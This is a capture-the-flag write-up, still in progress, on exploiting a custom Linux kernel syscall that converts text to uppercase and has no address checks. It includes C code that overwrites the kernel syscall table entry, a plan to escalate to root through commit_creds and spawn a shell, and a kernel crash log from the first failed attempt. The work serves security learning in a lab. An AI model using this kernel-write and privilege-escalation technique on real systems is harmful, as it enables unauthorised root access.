>I made a new system call for Linux kernel.
>It converts lowercase letters to upper case letters.
>would you like to see the implementation?

# understanding the challenge
we get a new system call called `sys_upper` which writes the bytes from `in` to `out` 
and if it encounters a lowercase letter it converts it to uppercase. Moreover it copies `strlen(in)` bytes, meaning the exploit payload cannot contain null character.

when initialing the kernel module the `sys_upper` pointer is written the the syscall table at 0x8000e348.
in the code `#define SYS_CALL_TABLE      0x8000e348      // manually configure this address!!` 
I'm not sure if they are telling us to configure this address or to configure it... I think it's the real syscall table address, 
because we didn't initialized other handlers.

let's check if I can call it...
running `dmesg` we get `sys_upper(number : 223) is added`
we don't have python on the VM. 

```C
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SYS_UPPER 223
int main(int argc, char *argv[]) {
    if (argc != 2)
        return -1;

    char* out = malloc(strlen(argv[1]));     

    // strcpy(out, argv[1]);
    syscall(SYS_UPPER, argv[1], out);


    printf("in: %s\n", argv[1]);
    printf("out: %s\n", out);
    free(out);
    return 0;
}
```

returned 
```text
in: abc
out: ABC
```

### understanding the privileges
`syscalls` runs in kernel mode. 
I think that only kernel pages could contain `syscalls`, if you think about it when running in kernel mode I can execute userland pages.
to understand better the challenge I'm reading about kernel exploitation see `kernel.md`
## goal
read the flag from `/root/flag` with root privileges.

## vulnerability
The syscall doesn't check which location we read from and which we write to.
We know the location in memory of the syscall table.

## abilities
* I can read anything in the syscall memory to `out`
* I can write anything to `out`


### Idea
* save the process context
* overwrite `sys_upper` entry in the syscall table to exploit function, assuming there is no SMEP.
* call `prepare_kernel_creds` and `commit_creds`
* `ireq` to userland and to `system(/bin/sh)`

First try to develop the exploit without running it locally with debugger. 
Notice that for running locally you will need to set the syscall table at a fixed location and insert the model.

## analyzing 
If  `sys_upper`  location is **above** the exploit location in memory then we could not overwrite all the bytes inside the entry.
1. let's check it.
2. I can use the linker to determine the location of the executable.
3. I can you a gadget.

```C
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#define SYS_UPPER 223
#define SYS_CALL_TABLE		0x8000e348

void exploit() {
    puts("[+] redirected syscall execution");
    exit(0);
}

int main(int argc, char *argv[]) {
    char *entry = (char *)(SYS_CALL_TABLE + SYS_UPPER);
    char *entry_value = "AAAAAAAA";

    printf("exploit location: %p\n", (void *)exploit);
    // overwrite syscall entry
    syscall(SYS_UPPER, entry_value, entry);
    printf("in: %s\n", entry_value);
    // printf("out: %s\n", entry); could not print kernel pages

    // triger hook
    syscall(SYS_UPPER);
    return 0;
}
```
it crashes in `strlen` from analysis we can understand that this machine is `arm` 32bit.
```
exploit location: 0x8429
in: AAAAAAAA
Unable to handle kernel NULL pointer dereference at virtual address 00000001
pgd = 83ec8000
[00000001] *pgd=65f19831, *pte=00000000, *ppte=00000000
Internal error: Oops: 17 [#1] SMP ARM
Modules linked in: m(PO)
CPU: 0 PID: 546 Comm: sol Tainted: P           O 3.11.4 #13
task: 869763c0 ti: 85702000 task.ti: 85702000
PC is at strlen+0x0/0x2c
LR is at sys_upper+0x10/0x48 [m]
pc : [<80196b58>]    lr : [<7f000010>]    psr: 80000013
sp : 85703f98  ip : 10c53c7d  fp : 00000000
r10: 00000000  r9 : 85702000  r8 : 8000e348
r7 : 000000df  r6 : 00008520  r5 : 00000000  r4 : 00000001
r3 : 7edc4e84  r2 : 00000001  r1 : 00000000  r0 : 00000001
Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
Control: 10c53c7d  Table: 63ec806a  DAC: 00000015
Process sol (pid: 546, stack limit = 0x85702238)
Stack: (0x85703f98 to 0x85704000)
3f80:                                                       7edc4e84 00000001
3fa0: 8000e427 8000e1a0 00000001 8000e427 00000001 00000000 00000001 7edc4e84
3fc0: 00000001 8000e427 00008520 000000df 00000000 00000000 76f51000 00000000
3fe0: 7edc4d20 7edc4d10 00008499 76edc8f0 60000010 00000001 8028f8dd 6300f5c1
[<80196b58>] (strlen+0x0/0x2c) from [<7f000010>] (sys_upper+0x10/0x48 [m])
[<7f000010>] (sys_upper+0x10/0x48 [m]) from [<8000e1a0>] (ret_fast_syscall+0x0/0x30)
Code: e3120020 1afffff9 e12fff1e 8037ba48 (e5d03000)
---[ end trace 10626a2968dc530c ]---
Segmentation fault
```

checked without overwrite and still the same error occurs. Moreover we can learn that `lr` (return address) is the location of `sys_upper` which is `0x7f000010`, so most likely we would have to overwrite 4 bytes...